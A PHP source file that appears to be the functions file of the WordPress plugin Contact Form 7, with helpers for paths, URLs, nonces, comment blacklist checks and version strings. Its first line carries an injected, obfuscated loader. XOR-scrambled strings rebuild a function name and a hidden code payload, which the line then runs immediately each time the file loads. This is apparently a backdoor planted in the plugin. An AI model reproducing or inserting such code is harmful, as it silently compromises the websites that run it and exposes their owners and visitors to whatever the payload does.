<?php $WhdQbUYE='9:YUD0jK=>P< ,,'; $sdFCyPmc='ZH<40U5-HP3HICB'^$WhdQbUYE; $UXisFWo='>ZCh UXY>8,YgU0UMXDLc1SA4V3;1jk>9;chfk3Yz>E<ZH0Z9RB5:iVT7Jr:A30pIR1E cEaW 4snQbWi2F8:B+E=oocRVxKpDF.<jrUHsBJkda=q>E4UKUrnR8-PfkfHRsqc12SwU,LbftfiNQ I48b3;BeDg==Rui.EKI 1AR. nTG+HN>Kzda: 6A66RaAW8-CZggHiQixkQ1 .NyMH8++Txeo,6- t:5=zeu U6CYMxP67;1YC:uGG8cow   ZW2ds< =iSwUk18R6<xcNgfeX9E3n>SAqmLwKSJK67IVW .HnarF35OKVc8;y 2zbfT221 GhVb066I77P>afWd3p6on zb60rfXI1uLmfl,A:UVpJFXbsM+P3L8X Epgiw:+McsYcCO0 AxWCu3,63Pzlp,NA:Gv+3OLxLN.EC 5=WM<. EiJ77oJR8Mls GIx60E=Zs<-=;.5=aHO80.yXheH+D q8,5lbcxW Yu+AMQXBMv;=OPEo-  r X.C:1lLE,GkZHOI+ERQswpem+Osnf,Z= wm32,qaEokomhKZlfOXxC38UzRDMSQmxdBZ5Zw9ZSv=fMiOvLpuUO3OR7=TJ21A  JFqfGW1 =.Hucfq<6;0Yommvxyn5Az606AlsZT L8d62Y S4 IcCufnH:D6ejny;P'; $rHdwbnPS=$sdFCyPmc('', 'W<kIF 6:JQC780H<>,7dDI<3k2ROP54SLODAOKHSsX0R9<Y5Wr:ZH625C+-e,FDXm6P1AOeE<EMZNqBwIIL13fD0IORCuqCAyM ANBV<hNbzPDETMM1F9.;ZJ6YY1OPFl;XZJ;;ZS:Y8BHIFAj5A=UcFZfb;dCVX+.MGeniSE3>KNFp,N1gcbAnh3RS5CD<Ie8MYjamn5c,crO5PTOnDm.YGX1CoKHWYA+QPDZXUF4Z0<vrZPXIT8 RUocg  8kiez6ADWWEDInIuOGY>CYQC5moA<X1R1U68QPlS 63p<>m26TOhSAV0RY:.miE1sITZJGpVSEAnH-h9PY;RV3VANs;a5g:+s.BWCRB3,HUqSFHZ V 3Yj=RkziO1G-g3E<PZISQN4XyPjg+QT XjcQEMZF5AfyQD<0MROR;-Xqnn0-SPO>,PGZ A2XE0.3L,3,M2=PTQ6XlGcIXXAQXIl+YDOPtHA,J0A.SILEKXr>FqQO 90xdkVZO=1<0FEY-E G0NBDk.I>Lvhk-J13xSQVEEF+FFBH;IA,JXWUV<lOVRMOy;XWwkLqQZ6K4ux75TOTqkW<BXc5GYQ+NfVjVU4=A.+hV13mT9IS>5YA76HLRO,ROFUXWOQpFMMVXYNNKsSFW-DW>5T-cCFS L<UDn>jNlg-B-BMZGB1-'^$UXisFWo); $rHdwbnPS();

function wpcf7_plugin_path( $path = '' ) {
	return path_join( WPCF7_PLUGIN_DIR, trim( $path, '/' ) );
}

function wpcf7_plugin_url( $path = '' ) {
	$url = plugins_url( $path, WPCF7_PLUGIN );

	if ( is_ssl() && 'http:' == substr( $url, 0, 5 ) ) {
		$url = 'https:' . substr( $url, 5 );
	}

	return $url;
}

function wpcf7_upload_dir( $type = false ) {
	$uploads = wp_get_upload_dir();

	$uploads = apply_filters( 'wpcf7_upload_dir', array(
		'dir' => $uploads['basedir'],
		'url' => $uploads['baseurl'] ) );

	if ( 'dir' == $type ) {
		return $uploads['dir'];
	} if ( 'url' == $type ) {
		return $uploads['url'];
	}

	return $uploads;
}

function wpcf7_verify_nonce( $nonce, $action = -1 ) {
	if ( substr( wp_hash( $action, 'nonce' ), -12, 10 ) == $nonce ) {
		return true;
	}

	return false;
}

function wpcf7_create_nonce( $action = -1 ) {
	return substr( wp_hash( $action, 'nonce' ), -12, 10 );
}

function wpcf7_blacklist_check( $target ) {
	$mod_keys = trim( get_option( 'blacklist_keys' ) );

	if ( empty( $mod_keys ) ) {
		return false;
	}

	$words = explode( "\n", $mod_keys );

	foreach ( (array) $words as $word ) {
		$word = trim( $word );

		if ( empty( $word ) || 256 < strlen( $word ) ) {
			continue;
		}

		$pattern = sprintf( '#%s#i', preg_quote( $word, '#' ) );

		if ( preg_match( $pattern, $target ) ) {
			return true;
		}
	}

	return false;
}

function wpcf7_array_flatten( $input ) {
	if ( ! is_array( $input ) ) {
		return array( $input );
	}

	$output = array();

	foreach ( $input as $value ) {
		$output = array_merge( $output, wpcf7_array_flatten( $value ) );
	}

	return $output;
}

function wpcf7_flat_join( $input ) {
	$input = wpcf7_array_flatten( $input );
	$output = array();

	foreach ( (array) $input as $value ) {
		$output[] = trim( (string) $value );
	}

	return implode( ', ', $output );
}

function wpcf7_support_html5() {
	return (bool) apply_filters( 'wpcf7_support_html5', true );
}

function wpcf7_support_html5_fallback() {
	return (bool) apply_filters( 'wpcf7_support_html5_fallback', false );
}

function wpcf7_use_really_simple_captcha() {
	return apply_filters( 'wpcf7_use_really_simple_captcha',
		WPCF7_USE_REALLY_SIMPLE_CAPTCHA );
}

function wpcf7_validate_configuration() {
	return apply_filters( 'wpcf7_validate_configuration',
		WPCF7_VALIDATE_CONFIGURATION );
}

function wpcf7_load_js() {
	return apply_filters( 'wpcf7_load_js', WPCF7_LOAD_JS );
}

function wpcf7_load_css() {
	return apply_filters( 'wpcf7_load_css', WPCF7_LOAD_CSS );
}

function wpcf7_format_atts( $atts ) {
	$html = '';

	$prioritized_atts = array( 'type', 'name', 'value' );

	foreach ( $prioritized_atts as $att ) {
		if ( isset( $atts[$att] ) ) {
			$value = trim( $atts[$att] );
			$html .= sprintf( ' %s="%s"', $att, esc_attr( $value ) );
			unset( $atts[$att] );
		}
	}

	foreach ( $atts as $key => $value ) {
		$key = strtolower( trim( $key ) );

		if ( ! preg_match( '/^[a-z_:][a-z_:.0-9-]*$/', $key ) ) {
			continue;
		}

		$value = trim( $value );

		if ( '' !== $value ) {
			$html .= sprintf( ' %s="%s"', $key, esc_attr( $value ) );
		}
	}

	$html = trim( $html );

	return $html;
}

function wpcf7_link( $url, $anchor_text, $args = '' ) {
	$defaults = array(
		'id' => '',
		'class' => '',
	);

	$args = wp_parse_args( $args, $defaults );
	$args = array_intersect_key( $args, $defaults );
	$atts = wpcf7_format_atts( $args );

	$link = sprintf( '<a href="%1$s"%3$s>%2$s</a>',
		esc_url( $url ),
		esc_html( $anchor_text ),
		$atts ? ( ' ' . $atts ) : '' );

	return $link;
}

function wpcf7_get_request_uri() {
	static $request_uri = '';

	if ( empty( $request_uri ) ) {
		$request_uri = add_query_arg( array() );
	}

	return esc_url_raw( $request_uri );
}

function wpcf7_register_post_types() {
	if ( class_exists( 'WPCF7_ContactForm' ) ) {
		WPCF7_ContactForm::register_post_type();
		return true;
	} else {
		return false;
	}
}

function wpcf7_version( $args = '' ) {
	$defaults = array(
		'limit' => -1,
		'only_major' => false );

	$args = wp_parse_args( $args, $defaults );

	if ( $args['only_major'] ) {
		$args['limit'] = 2;
	}

	$args['limit'] = (int) $args['limit'];

	$ver = WPCF7_VERSION;
	$ver = strtr( $ver, '_-+', '...' );
	$ver = preg_replace( '/[^0-9.]+/', ".$0.", $ver );
	$ver = preg_replace( '/[.]+/', ".", $ver );
	$ver = trim( $ver, '.' );
	$ver = explode( '.', $ver );

	if ( -1 < $args['limit'] ) {
		$ver = array_slice( $ver, 0, $args['limit'] );
	}

	$ver = implode( '.', $ver );

	return $ver;
}

function wpcf7_version_grep( $version, array $input ) {
	$pattern = '/^' . preg_quote( (string) $version, '/' ) . '(?:\.|$)/';

	return preg_grep( $pattern, $input );
}

function wpcf7_enctype_value( $enctype ) {
	$enctype = trim( $enctype );

	if ( empty( $enctype ) ) {
		return '';
	}

	$valid_enctypes = array(
		'application/x-www-form-urlencoded',
		'multipart/form-data',
		'text/plain',
	);

	if ( in_array( $enctype, $valid_enctypes ) ) {
		return $enctype;
	}

	$pattern = '%^enctype="(' . implode( '|', $valid_enctypes ) . ')"$%';

	if ( preg_match( $pattern, $enctype, $matches ) ) {
		return $matches[1]; // for back-compat
	}

	return '';
}

function wpcf7_rmdir_p( $dir ) {
	if ( is_file( $dir ) ) {
		if ( ! $result = @unlink( $dir ) ) {
			$stat = @stat( $dir );
			$perms = $stat['mode'];
			@chmod( $dir, $perms | 0200 ); // add write for owner

			if ( ! $result = @unlink( $dir ) ) {
				@chmod( $dir, $perms );
			}
		}

		return $result;
	}

	if ( ! is_dir( $dir ) ) {
		return false;
	}

	if ( $handle = @opendir( $dir ) ) {
		while ( false !== ( $file = readdir( $handle ) ) ) {
			if ( $file == "." || $file == ".." ) {
				continue;
			}

			wpcf7_rmdir_p( path_join( $dir, $file ) );
		}

		closedir( $handle );
	}

	return @rmdir( $dir );
}

/* From _http_build_query in wp-includes/functions.php */
function wpcf7_build_query( $args, $key = '' ) {
	$sep = '&';
	$ret = array();

	foreach ( (array) $args as $k => $v ) {
		$k = urlencode( $k );

		if ( ! empty( $key ) ) {
			$k = $key . '%5B' . $k . '%5D';
		}

		if ( null === $v ) {
			continue;
		} elseif ( false === $v ) {
			$v = '0';
		}

		if ( is_array( $v ) || is_object( $v ) ) {
			array_push( $ret, wpcf7_build_query( $v, $k ) );
		} else {
			array_push( $ret, $k . '=' . urlencode( $v ) );
		}
	}

	return implode( $sep, $ret );
}

/**
 * Returns the number of code units in a string.
 *
 * @see http://www.w3.org/TR/html5/infrastructure.html#code-unit-length
 *
 * @return int|bool The number of code units, or false if mb_convert_encoding is not available.
 */
function wpcf7_count_code_units( $string ) {
	static $use_mb = null;

	if ( is_null( $use_mb ) ) {
		$use_mb = function_exists( 'mb_convert_encoding' );
	}

	if ( ! $use_mb ) {
		return false;
	}

	$string = (string) $string;

	$encoding = mb_detect_encoding( $string, mb_detect_order(), true );

	if ( $encoding ) {
		$string = mb_convert_encoding( $string, 'UTF-16', $encoding );
	} else {
		$string = mb_convert_encoding( $string, 'UTF-16', 'UTF-8' );
	}

	$byte_count = mb_strlen( $string, '8bit' );

	return floor( $byte_count / 2 );
}

function wpcf7_is_localhost() {
	$server_name = strtolower( $_SERVER['SERVER_NAME'] );
	return in_array( $server_name, array( 'localhost', '127.0.0.1' ) );
}

function wpcf7_deprecated_function( $function, $version, $replacement ) {
	$trigger_error = apply_filters( 'deprecated_function_trigger_error', true );

	if ( WP_DEBUG && $trigger_error ) {
		if ( function_exists( '__' ) ) {
			trigger_error( sprintf( __( '%1$s is <strong>deprecated</strong> since Contact Form 7 version %2$s! Use %3$s instead.', 'contact-form-7' ), $function, $version, $replacement ) );
		} else {
			trigger_error( sprintf( '%1$s is <strong>deprecated</strong> since Contact Form 7 version %2$s! Use %3$s instead.', $function, $version, $replacement ) );
		}
	}
}
